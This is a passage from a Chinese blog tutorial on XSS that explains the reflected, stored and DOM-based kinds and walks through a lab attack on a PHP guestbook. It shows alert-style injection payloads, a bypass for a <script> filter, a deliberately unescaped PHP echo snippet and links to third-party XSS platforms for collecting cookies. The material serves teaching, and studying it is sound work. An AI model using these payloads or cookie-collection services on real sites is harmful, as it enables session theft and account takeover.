href="/tags/XAUUSD/" style="font-size: 1.05rem;">XAUUSD<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>2</sup></a><a href="/tags/%E3%80%8AJavaScript%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97%E3%80%8B/" style="font-size: 1.05rem;">《JavaScript权威指南》<sup>17</sup></a><a href="/tags/%E5%8C%BF%E5%90%8D/" style="font-size: 1.05rem;">匿名<sup>3</sup></a><a href="/tags/%E5%8D%9A%E5%AE%A2/" style="font-size: 1.05rem;">博客<sup>10</sup></a><a href="/tags/%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">安全<sup>20</sup></a><a href="/tags/%E6%94%AF%E4%BB%98/" style="font-size: 1.05rem;">支付<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2/" style="font-size: 1.05rem;">攻防<sup>1</sup></a><a href="/tags/%E6%97%85%E8%A1%8C/" style="font-size: 1.05rem;">旅行<sup>1</sup></a><a href="/tags/%E8%99%9A%E6%8B%9F%E6%9C%BA/" style="font-size: 1.05rem;">虚拟机<sup>4</sup></a><a href="/tags/%E8%B6%8A%E6%9D%83/" style="font-size: 1.05rem;">越权<sup>2</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/08/"><span class="card-archive-list-date">八月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/07/"><span class="card-archive-list-date">七月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/06/"><span class="card-archive-list-date">六月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/05/"><span class="card-archive-list-date">五月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/04/"><span class="card-archive-list-date">四月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">37</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/03/"><span class="card-archive-list-date">三月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url">技术</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a></span><span class="article-meta tags"><a class="article-meta__tags" href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>安全</span></a><a class="article-meta__tags" href="/tags/XSS/" tabindex="-1" itemprop="url"> <span> <i class="anzhiyufont anzhiyu-icon-hashtag"></i>XSS</span></a></span></div></div><h1 class="post-title" itemprop="name headline">XSS 跨站漏洞</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2023-04-20T16:00:00.000Z" title="发表于 2023-04-21 00:00:00">2023-04-21</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2023-04-20T17:44:10.000Z" title="更新于 2023-04-21 01:44:10">2023-04-21</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-pv-cv" id="" data-flag-title="XSS 跨站漏洞"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span id="busuanzi_value_page_pv"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator">       </span><span class="post-meta-position" title="作者IP属地为长沙"><i class="anzhiyufont anzhiyu-icon-location-dot"></i>长沙</span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M -160 44 c 30 0 58 -18 88 -18 s 58 18 88 18 s 58 -18 88 -18 s 58 18 88 18 v 44 h -352 Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section><div id="post-top-cover"><img class="nolazyload" id="post-top-bg" src="https://imagesblog.oss-cn-hangzhou.aliyuncs.com/themes/post/default_cover4.jpg"></div></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container" itemscope itemtype="http://www.houyanbin.com/2023/04/21/%E5%AE%89%E5%85%A8/XSS%20%E8%B7%A8%E7%AB%99%E6%BC%8F%E6%B4%9E/"><header><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url">技术</a><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/%E5%AE%89%E5%85%A8/" itemprop="url">安全</a><a href="/tags/%E5%AE%89%E5%85%A8/" tabindex="-1" itemprop="url">安全</a><a href="/tags/XSS/" tabindex="-1" itemprop="url">XSS</a><h1 id="CrawlerTitle" itemprop="name headline">XSS 跨站漏洞</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">Jack hou</span><time itemprop="dateCreated datePublished" datetime="2023-04-20T16:00:00.000Z" title="发表于 2023-04-21 00:00:00">2023-04-21</time><time itemprop="dateCreated datePublished" datetime="2023-04-20T17:44:10.000Z" title="更新于 2023-04-21 01:44:10">2023-04-21</time></header><meta name="referrer" content="no-referrer"/>


<h1 id="一、XSS-跨站漏洞"><a href="#一、XSS-跨站漏洞" class="headerlink" title="一、XSS 跨站漏洞"></a>一、XSS 跨站漏洞</h1><h3 id="（1）XSS-简介"><a href="#（1）XSS-简介" class="headerlink" title="（1）XSS 简介"></a>（1）XSS 简介</h3><p>网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web 应用程序能够输出相应的内容。动态站点会受到一种名为 “跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成 XSS, 原本应当是 css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称 XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web 页面里插入恶意 Script 代码，当用户浏览该页之时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。</p>
<p>跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用 xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和 cookie 等各种内容</p>
<p>攻击者利用 XSS 漏洞旁路掉访问控制——例如同源策略 (same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing) 攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而 JavaScript 是新型的“ShellCode”。</p>
<p>xss 漏洞通常是通过 php 的输出函数将 javascript 代码输出到 html 页面中，通过用户本地浏览器执行的，所以 xss 漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$xss = $_GET[&#x27;x&#x27;];</span><br><span class="line">echo $xss;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-d526faca19246c12.png"></p>
<h3 id="（2）产生层面"><a href="#（2）产生层面" class="headerlink" title="（2）产生层面"></a>（2）产生层面</h3><p>产生层面一般都是在前端，JavaScript 代码能干什么，执行之后就会达到相应的效果</p>
<h3 id="（3）函数类"><a href="#（3）函数类" class="headerlink" title="（3）函数类"></a>（3）函数类</h3><p>比如说 php 中的脚本的输出函数</p>
<p>常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
<h3 id="（4）危害影响"><a href="#（4）危害影响" class="headerlink" title="（4）危害影响"></a>（4）危害影响</h3><ul>
<li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p>
</li>
<li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p>
</li>
<li><p>盗窃企业重要的具有商业价值的资料</p>
</li>
<li><p>非法转账</p>
</li>
<li><p>强制发送电子邮件</p>
</li>
<li><p>网站挂马</p>
</li>
<li><p>控制受害者机器向其它网站发起攻击</p>
</li>
</ul>
<p>其实归根结底，XSS 的攻击方式就是想办法 “教唆” 用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在 XSS 中除非恶作剧，不然是不会在恶意植入代码中写上<code>alert(&quot;say something&quot;)</code>的。在真正的应用中，XSS 攻击可以干的事情还有很多，这里举两个例子。</p>
<ol>
<li><p><strong>窃取网页浏览中的 cookie 值</strong>。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个 cookie 值。这个 cookie 值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的 cookie 值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过 script 脚本获得当前页面的 cookie 值，通常会用到 cookie。试想下如果像空间说说中能够写入 xss 攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似 QQ 的 cookie 有其他验证措施保证同一 cookie 不能被滥用）</p>
</li>
<li><p><strong>劫持流量实现恶意跳转</strong>。这个很简单，就是在网页中想办法插入一句像这样的语句： <code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页。早在 2011 年新浪就曾爆出过严重的 xss 漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p>
</li>
</ol>
<h3 id="（5）浏览器内核版本"><a href="#（5）浏览器内核版本" class="headerlink" title="（5）浏览器内核版本"></a>（5）浏览器内核版本</h3><p>利用 XSS 需要浏览器版本和内核没有过滤 XSS 攻击（比如用谷歌 Edge 火狐等打开可以成功，但是 IE 却会拦截）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-bca64ac44557621b.png"></p>
<h3 id="（6）常出现场景"><a href="#（6）常出现场景" class="headerlink" title="（6）常出现场景"></a>（6）常出现场景</h3><p>文章发表、评论、留言、注册资料的地方、修改资料的地方等</p>
<h1 id="二、XSS-攻击的分类"><a href="#二、XSS-攻击的分类" class="headerlink" title="二、XSS 攻击的分类"></a>二、XSS 攻击的分类</h1><p>XSS 攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
<h3 id="（1）来自内部的攻击"><a href="#（1）来自内部的攻击" class="headerlink" title="（1）来自内部的攻击"></a>（1）来自内部的攻击</h3><p>主要指的是利用程序自身的漏洞，构造跨站语句，如: dvbbs 的 showerror.asp 存在的跨站漏洞。</p>
<h3 id="（2）来自外部的攻击"><a href="#（2）来自外部的攻击" class="headerlink" title="（2）来自外部的攻击"></a>（2）来自外部的攻击</h3><p>主要指的自己构造 XSS 跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
<h1 id="三、XSS-的分类"><a href="#三、XSS-的分类" class="headerlink" title="三、XSS 的分类"></a>三、XSS 的分类</h1><h2 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型 (非持久化)"></a>1、反射型 (非持久化)</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>反射型 xss 又称非持久型 xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS 代码出现在 URL 中，作为输入提交到服务器端，服务器端解析后响应，XSS 代码随响应内容一起传回给浏览器，最后浏览器解析执行 XSS 代码。这个过程像一次反射，所以称反射型 XSS。</p>
<h3 id="（2）攻击方式"><a href="#（2）攻击方式" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>攻击者通过电子邮件等方式将包含 xss 代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有 xss 代码的数据发送给目标用户的浏览器，浏览器解析这段带有 xss 代码的恶意脚本后就会触发 xss 漏洞</p>
<h3 id="（3）判断是否存在反射型-xss-漏洞并利用"><a href="#（3）判断是否存在反射型-xss-漏洞并利用" class="headerlink" title="（3）判断是否存在反射型 xss 漏洞并利用"></a>（3）判断是否存在反射型 xss 漏洞并利用</h3><h4 id="①-判断有没有过滤一些特殊的字符"><a href="#①-判断有没有过滤一些特殊的字符" class="headerlink" title="① 判断有没有过滤一些特殊的字符"></a>① 判断有没有过滤一些特殊的字符</h4><p>比如对比输出的字符和输出的字符，可以看到有些字符被过滤了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-724b1320aad2ff39.png"></p>
<h4 id="②-注入代码"><a href="#②-注入代码" class="headerlink" title="② 注入代码"></a>② 注入代码</h4><p>下面是大概的原理</p>
<p>假如我输入的是 1，提交后，点击查看网页源代码</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-037d65c4a2fae924.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-20c059cec3d3fa60.png"></p>
<h4 id="③-插入代码"><a href="#③-插入代码" class="headerlink" title="③ 插入代码"></a>③ 插入代码</h4><p><code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code> #如果读取图片失败，则用 alert 显示相关信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b620655fd14dcaba.png"> img</p>
<p>显示了信息，则说明存在 xss 注入</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-8aa3c2680b1f0171.png"> img</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-79aa1dcf37751d2a.png"></p>
<p>可以对比看到，通过前面的闭合以及后面的代码插入，读取不到图片，因此触发了 alert 弹窗，显示了括号内的内容即 &#x2F; xss&#x2F;</p>
<h4 id="④-利用-xss-漏洞"><a href="#④-利用-xss-漏洞" class="headerlink" title="④ 利用 xss 漏洞"></a>④ 利用 xss 漏洞</h4><p>将刚刚成功注入代码并能触发 xss 的网址通过电子邮件等方式发送给对方的手中，如果结合 xss 平台，对方点击了链接，就能得到对方的 cookie 等信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ff86a5cc65677ef6.png"></p>
<h2 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型 (持久化)"></a>2、存储型 (持久化)</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-459a37e45df7d961.png"></p>
<h3 id="（1）原理-1"><a href="#（1）原理-1" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>存储型 XSS 和反射型 XSS 的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交 XSS 代码。最典型的例子就是留言板 XSS，用户提交一条包含 XSS 代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了 XSS 攻击</p>
<h3 id="（2）攻击方式-1"><a href="#（2）攻击方式-1" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
<h3 id="（3）payload"><a href="#（3）payload" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p>
<p>注入后重新刷新发现直接回显注入的东西，说明是存储型 xss</p>
<h2 id="3、DOM-型"><a href="#3、DOM-型" class="headerlink" title="3、DOM 型"></a>3、DOM 型</h2><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-41d0757a444c8eb8.png"></p>
<h3 id="（1）原理-2"><a href="#（1）原理-2" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>文档对象模型 Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p>
<p>DOM 型 xss 其实是一种特殊类型的反射型 xss，也被称作<strong>本地跨站</strong>，它是基于 DOM 文档对象模型的一种漏洞。<strong>DOM XSS 和反射型 XSS、存储型 XSS 的区别在于 DOM XSS 代码并不需要服务器参与，出发 XSS 靠的是浏览器的 DOM 解析，完全是客户端的事情</strong></p>
<p>DOM 中有很多对象，其中一些对象可以被用户所操纵，如 url，location 等。客户端的脚本程序可以通过 DOM 来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得 DOM 中的数据后并在本地执行，因此仅从服务器端是没有办法防御 DOM 型 XSS 漏洞的，如若 DOM 中的数据没有经过严格的验证，便会产生基于 DOM 的 XSS 漏洞。</p>
<p>基于 DOM 的 XSS 是反射的特例，其中 JavaScript 隐藏在 URL 中，并在其呈现时由页面中的 JavaScript 取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的 WAF 或其他防护检测不出恶意内容。</p>
<h3 id="（2）攻击方式-2"><a href="#（2）攻击方式-2" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>用户请求一个经过专门设计的 URL，它由攻击者提交，而且其中包含 xss 代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM 对象就会处理 xss 代码，导致存在 xss 漏洞</p>
<h3 id="（3）payload-1"><a href="#（3）payload-1" class="headerlink" title="（3）payload"></a>（3）payload</h3><ul>
<li><code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></li>
</ul>
<h1 id="四、XSS-攻击的途径"><a href="#四、XSS-攻击的途径" class="headerlink" title="四、XSS 攻击的途径"></a>四、XSS 攻击的途径</h1><p>XSS 攻击方法只是利用 HTML 的属性做各种尝试，找出注入的方法。现在对三种 XSS 攻击的主要方式进行分析。</p>
<ol>
<li><p>第一种：对普通的用户输入，页面原样输出，攻击者通过对 JSCODE 的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的 Cookie.</p>
</li>
<li><p>第二种：在代码区内存在有用户输入的内容</p>
</li>
<li><p>第三种：允许用户输入 HTML 标签的页面，用户可以提交一些自定义的 HTML 代码。</p>
</li>
</ol>
<h1 id="五、靶场实战"><a href="#五、靶场实战" class="headerlink" title="五、靶场实战"></a>五、靶场实战</h1><h2 id="1、PHP-开源多功能留言板"><a href="#1、PHP-开源多功能留言板" class="headerlink" title="1、PHP 开源多功能留言板"></a>1、PHP 开源多功能留言板</h2><h3 id="（1）搭建靶场"><a href="#（1）搭建靶场" class="headerlink" title="（1）搭建靶场"></a>（1）搭建靶场</h3><p>PHP 开源多功能留言板下载地址：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://down.chinaz.com/soft/37581.htm">https://down.chinaz.com/soft/37581.htm</a> ，按照教程安装即可</p>
<h3 id="（2）XSS-平台"><a href="#（2）XSS-平台" class="headerlink" title="（2）XSS 平台"></a>（2）XSS 平台</h3><ul>
<li><p>网址 1：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://xss.pt/xss.php">https://xss.pt/xss.php</a></p>
</li>
<li><p>网址 2：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=http://xss.fbisb.com/xss.php">http://xss.fbisb.com/xss.php</a></p>
</li>
<li><p>网址 3：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://xss8.cc/login/">https://xss8.cc/login/</a></p>
</li>
<li><p>网址 4：<a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://xsshs.cn/xss.php?do=login">https://xsshs.cn/xss.php?do=login</a></p>
</li>
</ul>
<h3 id="（3）进行攻击"><a href="#（3）进行攻击" class="headerlink" title="（3）进行攻击"></a>（3）进行攻击</h3><h4 id="①-初次尝试"><a href="#①-初次尝试" class="headerlink" title="① 初次尝试"></a>① 初次尝试</h4><p>尝试用简单的 JS 代码进行 XSS 攻击</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b86f219b94c2d24d.png"></p>
<p>存在 JS 过滤</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-32cedc1447e3b223.png"></p>
<h4 id="②-绕过-lt-script-gt-检测"><a href="#②-绕过-lt-script-gt-检测" class="headerlink" title="② 绕过&lt;script&gt;检测"></a>② 绕过<code>&lt;script&gt;</code>检测</h4><p>使用以下语句绕过<code>&lt;script &gt;</code>过滤：<code>&lt;BODY onload=&quot;alert(&#39;XSS&#39;)&quot;&gt;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-2e983645a0b89c1f.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-de31246bb39b9abd.png"></p>
<p>成功弹出弹窗</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-421ceee16835a3a5.png"></p>
<p>管理员后台查看也会弹出弹窗</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-04b9e3cbec1003e3.png"></p>
<p>而弹出弹窗的原因就是这句 JS 代码嵌入到了代码中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ade1835d43667f1f.png"></p>
<h4 id="③-利用-XSS-平台获取-cookie"><a href="#③-利用-XSS-平台获取-cookie" class="headerlink" title="③ 利用 XSS 平台获取 cookie"></a>③ 利用 XSS 平台获取 cookie</h4><p>此时利用 XSS 平台，启用默认模块，因为这个留言板会过滤<code>&lt;script&gt;</code>标签，因此我选择使用 img 标签进行 XSS 攻击</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-b7241b47d6efb1a7.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-90dcdfda40729c8b.png"> img</p>
<p>发送 payload 成功</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-3a998fe109b3dba0.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-2e7516b96c7de8ea.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-ba1b7e0f224898fa.png"></p>
<p>管理员到后台查看留言</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="http://upload-images.jianshu.io/upload_images/27650211-a1967b12d014f919.png"></p>
